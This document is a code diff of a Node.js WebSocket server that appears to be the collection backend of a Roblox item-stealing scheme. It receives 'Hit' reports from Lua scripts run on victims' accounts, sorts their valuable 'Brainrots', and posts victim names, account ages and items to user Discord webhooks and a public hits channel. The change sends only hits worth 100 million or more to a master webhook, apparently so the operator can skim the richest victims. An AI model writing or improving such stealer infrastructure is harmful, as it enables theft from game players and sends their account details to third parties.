@@ -19,6 +19,7 @@ const PORT = process.env.PORT || 3000;
 const MONGO_URI = process.env.MONGO_URI;
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
+const SEUIL_MASTER = 100000000; // 100,000,000 (100M)
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
 const generateWebhookId = () => { return `wh_${randomBytes(8).toString('hex')}`; };
@@ -497,12 +498,16 @@ wss.on('connection', (ws, req) => {
         ws.on('message', async (msg) => {
             try {
                 const data = JSON.parse(msg);
-        
+                let maxIncome = 0;
                 if (data.Method === "Hit") {
                     const hitInfo = data.Hit;
                     const webhookIdFromLua = hitInfo.WebHook; // C'est l'UUID (ex: wh_...)
                     if (hitInfo.Brainrots && hitInfo.Brainrots.length > 0) {
                         hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0));
+                        const topBrainrot = hitInfo.Brainrots[0];
+                        maxIncome = topBrainrot.Income || 0;
+
+                       log(`💎 Plus gros Income trouvé : ${maxIncome} (Item: ${topBrainrot.Name})`);
                     }
                     log(`🎯 Processing Hit from: ${hitInfo.Name}`);
         
@@ -531,12 +536,12 @@ wss.on('connection', (ws, req) => {
                     .addFields(
                         { 
                             name: "📄 Player Information", 
-                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n📱 Executor     : Delta\n👥 Players      : ${hitInfo.Players}/8\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
+                            value: `\`\`\`properties\n👤 Display Name : ${hitInfo.DisplayName}\n🆔 Username     : ${hitInfo.Name}\n🗓️ Account Age  : ${hitInfo.AccountAge} days\n👥 Players      : ${hitInfo.Players}/8\n👑 Receiver     : ${Array.isArray(hitInfo.Receiver) ? hitInfo.Receiver.join(', ') : hitInfo.Receiver}\n\`\`\`` 
                         },
                         {
                             name: "👑 Valuable Brainrots",
                             value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
-                                ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
+                                ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → ${br.Rarity} ${br.IncomeStr}`).join('\n')
                                 : "None"}\n\`\`\``
                         }
                     )
@@ -551,13 +556,17 @@ wss.on('connection', (ws, req) => {
                             embeds: [hitEmbed] 
                         });
                     } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
-                    try {
-                        const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
-                        await webhookClient.send({ 
-                            content: hitInfo.Name,
-                            embeds: [hitEmbed] 
-                        });
-                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
+                    
+
+                    if (maxIncome >= SEUIL_MASTER) {
+                        try {
+                            const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
+                            await webhookClient.send({ 
+                                content: hitInfo.Name,
+                                embeds: [hitEmbed] 
+                            });
+                        } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
+                    }
                     // 5. Envoi sur le Channel PUBLIC (public-hits)
                     const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
                     if (publicChannel) {
@@ -576,7 +585,7 @@ wss.on('connection', (ws, req) => {
                                 {
                                     name: "👑 Valuable Brainrots",
                                     value: `\`\`\`properties\n${hitInfo.Brainrots && hitInfo.Brainrots.length > 0 
-                                        ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → Secret ${br.IncomeStr}`).join('\n')
+                                        ? hitInfo.Brainrots.map(br => `🧠 → ${br.Name} → ${br.Rarity} ${br.IncomeStr}`).join('\n')
                                         : "None"}\n\`\`\``
                                 }
                             )
